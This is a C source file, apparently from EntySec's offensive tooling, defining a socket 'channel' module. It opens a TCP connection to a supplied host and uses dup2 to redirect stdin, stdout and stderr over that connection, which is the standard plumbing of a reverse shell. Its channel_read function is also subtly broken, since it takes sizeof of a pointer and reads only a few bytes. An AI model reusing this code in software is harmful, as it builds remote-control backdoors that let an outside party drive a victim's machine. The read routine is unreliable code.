/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "channel.h"

int channel_open(char *host, int port)
{
    int channel = 0;
    struct sockaddr_in serv_addr;
    
    if ((channel = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        return -1;
  
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
  
    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) 
        return -1;
  
    if (connect(channel, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        return -1;
  
    return channel;
}

void channel_redirect(int channel)
{
    dup2(channel, STDOUT_FILENO);
    dup2(channel, STDIN_FILENO);
    dup2(channel, STDERR_FILENO);
}

void channel_close(int channel)
{
    close(channel);
}

void channel_send(int channel, char *data)
{
    send(channel, data, strlen(data), 0);
}

void channel_read(int channel, char *buffer)
{
    read(channel, buffer, sizeof buffer);
}
